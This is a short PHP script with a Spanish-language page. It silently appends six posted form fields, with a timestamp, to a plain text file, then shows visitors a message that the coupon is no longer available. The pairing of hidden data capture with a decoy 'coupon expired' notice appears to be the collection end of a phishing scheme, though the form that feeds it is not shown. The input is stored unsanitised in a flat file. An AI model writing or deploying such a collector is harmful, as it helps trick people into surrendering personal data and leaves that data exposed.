<?php

$input1 = $_POST['input1'] ?? '';
$input2 = $_POST['input2'] ?? '';
$input3 = $_POST['input3'] ?? '';
$input4 = $_POST['input4'] ?? '';
$input5 = $_POST['input5'] ?? '';
$input6 = $_POST['input6'] ?? '';

$registro =
date('Y-m-d H:i:s') . " | " .
$input1 . " | " .
$input2 . " | " .
$input3 . " | " .
$input4 . " | " .
$input5 . " | " .
$input6 . PHP_EOL;

file_put_contents("registros.txt", $registro, FILE_APPEND);

?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>No Disponible</title>
<style>
body{
    font-family:Arial,sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
    background:#f5f5f5;
}
.cartel{
    background:#fff;
    padding:40px;
    border-radius:10px;
    box-shadow:0 0 10px rgba(0,0,0,.1);
    text-align:center;
}
</style>
</head>
<body>
    <div class="cartel">
        <h1>Este cupón ya no está disponible</h1>
    </div>
</body>
</html>
